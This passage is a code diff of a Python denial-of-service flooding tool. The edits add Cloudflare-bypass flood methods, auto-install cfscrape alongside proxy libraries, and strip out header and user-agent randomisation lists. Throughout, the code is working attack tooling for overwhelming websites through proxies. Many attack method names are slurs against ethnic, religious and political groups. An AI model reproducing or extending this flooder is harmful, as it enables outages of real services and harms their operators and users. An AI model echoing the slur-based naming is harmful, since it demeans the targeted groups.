@@ -1,19 +1,15 @@
 #!/usr/bin/env python3
-import os, sys, random, string, captchascraper
-
+import os, sys, random, string
 from telnetlib import X3PAD
 try:
-    import socks, requests, wget, urllib3, ssl
+    import socks, requests, wget, cfscrape, urllib3, ssl
 except:
     if sys.platform.startswith("linux"):
-        os.system("pip3 install pysocks requests wget urllib3 scapy ssl")
-        pass
+        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy ssl")
     elif sys.platform.startswith("freebsd"):
-        os.system("pip3 install pysocks requests wget urllib3 scapy ssl")
-        pass
+        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy ssl")
     else:
-        os.system("pip install pysocks requests wget urllib3 scapy ssl")
-        pass
+        os.system("pip install pysocks requests wget cfscrape urllib3 scapy ssl")
     import socks, requests, wget, cfscrape, urllib3, ssl
  
 from concurrent.futures import ThreadPoolExecutor, as_completed
@@ -41,6 +37,7 @@ from typing import Any, List, Set, Tuple, final
 from urllib import parse
 from urllib.parse import urlparse
 from uuid import UUID, uuid4
+
 from PyRoxy import Proxy, ProxyChecker, ProxyType, ProxyUtiles
 from PyRoxy import Tools as ProxyTools
 from certifi import where
@@ -132,11 +129,10 @@ def exit(*message):
 
 class Methods:
     LAYER7_METHODS: Set[str] = {
-        "CFTANKIE", "CFTANKIE2", "CFFUNDIE", "CFFUNDIE2", 
-        "TANKIE_SPECIAL",
-        "CFPAPIST", "CFRAGHEAD", "CFRAGHEAD2", "CFRAGHEAD3",
-        "CF_ATTACK_RAGHEAD", "CF_ATTACK_RAGHEAD2", "CF_ATTACK_RAGHEAD3",
-        "AMAMI_CANON", "AMAMI_CANON2", "AMAMI_CANON3", 
+        "CFTANKIE", "CFTANKIE2", "CFFUNDIE", "CFFUNDIE2", "CFTANKIE3", "CFTANKIE4", 
+        "TANKIE_SPECIAL", "JINSANGPANG", "RAGHED_TANKIE",
+        "CFPAPIST", "CFRAGHEAD", "CFRAGHEAD2",
+        "AMAMI_CANON", "AMAMI_CANON2", "AMAMI_CANON3", "AMAMI_CANON4",
         "RAGHEAD", "PAPIST", "KACAP", "LOIC", "LOIC_CF",
         "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
         "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
@@ -693,15 +689,7 @@ class HttpFlood(Thread):
     _defaultpayload: Any
     _req_type: str
     _useragents: List[str]
-    _ita_useragents: List[str]
     _referers: List[str]
-    _ita_referers: List[str]
-    _acceptall: List[str]
-    _acceptencode: List[str]
-    _acceptlang: List[str]
-    _fetchmode: List[str]
-    _fetchsite: List[str]
-    _cache_control: List[str]
     _target: URL
     _method: str
     _rpc: int
@@ -737,13 +725,13 @@ class HttpFlood(Thread):
             "CFTANKIE2": self.CFTANKIE2,
             "CFFUNDIE": self.CFFUNDIE,
             "CFFUNDIE2": self.CFFUNDIE2,
-            "CF_ATTACK_RAGHEAD": self.CF_ATTACK_RAGHEAD,
-            "CF_ATTACK_RAGHEAD2": self.CF_ATTACK_RAGHEAD2,
-            "CF_ATTACK_RAGHEAD3": self.CF_ATTACK_RAGHEAD3,
+            "CFTANKIE3": self.CFTANKIE3,
+            "CFTANKIE4": self.CFTANKIE4,
+            "JINSANGPANG": self.JINSANGPANG,
             "CFPAPIST": self.CFPAPIST,
             "CFRAGHEAD": self.CFRAGHEAD,
             "CFRAGHEAD2": self.CFRAGHEAD2,
-            "CFRAGHEAD3": self.CFRAGHEAD3,
+            "RAGHED_TANKIE": self.RAGHED_TANKIE,
             "CFB": self.CFB,
             "CFBUAM": self.CFBUAM,
             "XMLRPC": self.XMLRPC,
@@ -762,6 +750,7 @@ class HttpFlood(Thread):
             "AMAMI_CANON" : self.AMAMI_CANON,
             "AMAMI_CANON2" : self.AMAMI_CANON2,
             "AMAMI_CANON3" : self.AMAMI_CANON3,
+            "AMAMI_CANON4" : self.AMAMI_CANON4,
             "STRESS": self.STRESS,
             "DYN": self.DYN,
             "SLOW": self.SLOW,
@@ -787,87 +776,6 @@ class HttpFlood(Thread):
                 ",https://www.google.com/translate?u="
             ]
         self._referers = list(referers)
-
-        ita_referers: List[str] = [
-            'http://help.baidu.com/searchResult?keywords=',
-            'http://www.bing.com/search?q=',
-            'https://www.yandex.com/yandsearch?text=',
-            'https://duckduckgo.com/?q=',
-            'http://www.ask.com/web?q=',
-            'http://search.aol.com/aol/search?q=',
-            'https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=',
-            'https://drive.google.com/viewerng/viewer?url=',
-            'http://validator.w3.org/feed/check.cgi?url=',
-            'http://host-tracker.com/check_page/?furl=',
-            'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=',
-            'http://jigsaw.w3.org/css-validator/validator?uri=',
-            'https://add.my.yahoo.com/rss?url=',
-            'http://www.google.com/?q=',
-            'http://www.usatoday.com/search/results?q=',
-            'http://engadget.search.aol.com/search?q=',
-            'https://steamcommunity.com/market/search?q=',
-            'http://filehippo.com/search?q=',
-            'http://www.topsiteminecraft.com/site/pinterest.com/search?q=',
-            'http://eu.battle.net/wow/en/search?q='
-        ]
-        self._ita_referers = list(ita_referers)
-
-        acceptall: List[str] = [
-            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", 
-            "text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8",
-            "application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5",
-            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-            "image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*",
-            "text/html, application/xhtml+xml, image/jxr, */*",
-            "text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1",
-            "text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8",
-            "text/html, application/xhtml+xml",
-            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-            "text/plain;q=0.8,image/png,*/*;q=0.5",
-            "text/css,*/*;q=0.1,text/html,application/xhtml+xml,application/xml;q=0.9,image/svg+xml,image/png,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
-        ]  
-        self._acceptall = list(acceptall)
-
-        acceptencode: List[str] = [
-            "br, gzip, deflate", 
-            "gzip, deflate", 
-            "deflate", 
-            "br, deflate",
-            "br",
-            "gzip",
-            "br;q=1.0, gzip;q=0.8, *;q=0.1",
-            "br;q=1.0, gzip;q=0.8, deflate;q=0.8, *;q=0.1",
-            "br;q=0.7, gzip;q=0.5, deflate;q=0.3, *;q=0.1",
-            "gzip;q=1.0, deflate;q=0.6, *;q=0.1",
-        ]  
-        self._acceptencode = list(acceptall)
-
-        acceptlang: List[str] = [
-            "en-US,en;q=0.5", 
-            "en-US,en;q=0.3", 
-            "utf-8, iso-8859-1;q=0.5, *;q=0.1", 
-            "vi,en;q=0.9,en-US;q=0.8",
-            "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5",
-            "ja,ja;q=0.9,zh-CN;q=0.5,en;q=0.3",
-            "pl,ja;q=0.7,en;q=0.3",
-            "pl,pl;q=0.7,en;q=0.3",
-            "fr,es;q=0.7,ja;q=0.2",
-            "it,it;q=0.9,fr;q=0.5,pl;q=0.4",
-            "kr,kr;q=0.9,cn;q=0.7,ja;q=0.4,*;q=0.2",
-            "ru,cn;q=0.5,kr;q=0.2",
-        ]  
-        self._acceptlang = list(acceptlang)
-
-        fetchmode: List[str] = [
-            "cors", 
-            "navigate", 
-            "no-cors", 
-            "same-origin",
-            "websocket",
-        ]  
-        self._fetchmode = list(fetchmode)
-
-
         if proxies:
             self._proxies = list(proxies)
 
@@ -910,130 +818,6 @@ class HttpFlood(Thread):
                 'Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'
             ]
         self._useragents = list(useragents)
-
-        ita_useragents: List[str] = [
-            "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
-            "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
-            "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
-            "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
-            "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
-            "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
-            "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
-            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
-            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
-            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
-            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
-            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
-            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
-            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1",
-            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre",
-            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2",
-            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",
-            "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
-            "Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
-            "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
-            "Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016",
-            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",
-            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
-            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18",
-            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10",
-            "Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)",
-            "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9",
-            "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8",
-            "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)","Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )","Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1","Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14","Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5","Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.8",
-            "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20","Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a","Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2","Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0","Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34",
-            "Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1",
-            "Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2",
-            "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1","Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
-            "Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ",
-            "Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
-            "Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre",
-            "Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0",
-            "Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2","Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0","Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24",
-            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1",
-            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
-            "Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre",
-            "Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
-            "Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2",
-            "Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
-            "Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre",
-            "Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0",
-            "Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1",
-            "Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0",
-            "Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8",
-            "Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0",
-            "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15",
-            "Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko",
-            "Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16",
-            "Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025",
-            "Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1",
-            "Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020",
-            "Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1",
-            "Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)",
-            "Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher",
-            "Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian",
-            "Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8",
-            "Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15",
-            "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8",
-            "Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7",
-            "Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.8",
-            "Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14",
-            "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)",
-            "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6",
-            "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)",
-            "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11",
-            "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)",
-            "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0",
-            "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2",
-            "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330",
-            "Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)",
-            "Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8",
-            "Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0",
-            "Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)",
-            "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9",
-            "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15",
-            "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
-            "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0",
-            "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)",
-            "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8",
-            "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12",
-            "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3",
-            "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5",
-            "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9",
-            "Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12",
-            "Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0",
-            "Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15",
-            "Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0",
-            "Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3",
-            "Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5",
-            "Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8",
-            "Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3",
-            "Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6",
-            "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9",
-            "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15",
-            "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7","Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0","Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN","Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
-            "Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
-            "Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
-            "Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN",
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN",
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN",
-            "Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
-        ]
-        self._ita_useragents = list(ita_useragents)
-
-        cache_control: List[str] = [
-                "max-age=0",
-                "no-cache",
-                "no-store",
-                "private",
-                "no-transform",
-                "only-if-cached",
-                "max-age=0",
-            ]
-        self._cache_control = list(cache_control)
-
-
         self._req_type = self.getMethodType(method)
         self._defaultpayload = "%s %s HTTP/%s\r\n" % (self._req_type,
                                                       target.raw_path_qs, randchoice(['1.0', '1.1', '1.2']))
@@ -1105,10 +889,9 @@ class HttpFlood(Thread):
 
     @staticmethod
     def getMethodType(method: str) -> str:
-        return "GET" if {method.upper()} & {"CFTANKIE", "CFTANKIE2", "CFFUNDIE", "CFFUNDIE2",
-                                            "TANKIE_SPECIAL", 
-                                            "CFPAPIST", "CFRAGHEAD", "CFRAGHEAD2", "CFRAGHEAD3",
-                                            "CF_ATTACK_RAGHEAD", "CF_ATTACK_RAGHEAD2",  "CF_ATTACK_RAGHEAD3",
+        return "GET" if {method.upper()} & {"CFTANKIE", "CFTANKIE2", "CFFUNDIE", "CFFUNDIE2", "CFTANKIE3", "CFTANKIE4", 
+                                            "JINSANGPANG", "TANKIE_SPECIAL", "RAGHED_TANKIE",
+                                            "CFPAPIST", "CFRAGHEAD", "CFRAGHEAD2",
                                             "AMAMI_CANON", "AMAMI_CANON2", "AMAMI_CANON3", 
                                             "KACAP", "PAPIST", "RAGHEAD", "LOIC", "LOIC_CF",
                                             "CFB", "CFBUAM", "GET", "TOR", "COOKIE", "OVH", "EVEN",
@@ -1117,20 +900,6 @@ class HttpFlood(Thread):
             else "POST" if {method.upper()} & {"POST", "XMLRPC", "STRESS", "AMAMI_CANON4"} \
             else "HEAD" if {method.upper()} & {"GSB", "HEAD"} \
             else "REQUESTS"
-
-    def get_headersx(self) -> dict:
-        return {"Host" : str(self._host),
-        "Connection" : "keep-alive",
-        "Cache-Control" : randchoice(self._cache_control),
-        "Upgrade-Insecure-Requests" : "1",
-        "User-Agent" : randchoice(self._useragents),
-        "Accept" : randchoice(self._acceptall),
-        "Accept-Encoding" : randchoice(self._acceptencode),
-        "Accept-Language" : randchoice(self._acceptlang),
-        "Sec-Fetch-Mode" : randchoice(self._fetchmode),
-        "Sec-Fetch-Site": "same-origin",
-        "Sec-Fetch-Dest": "document"}
-
 
     def POST(self) -> None:
         payload: bytes = self.generate_payload(
@@ -1283,9 +1052,9 @@ class HttpFlood(Thread):
             pro = randchoice(self._proxies)
         s = None
 
-        #cfscrape.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
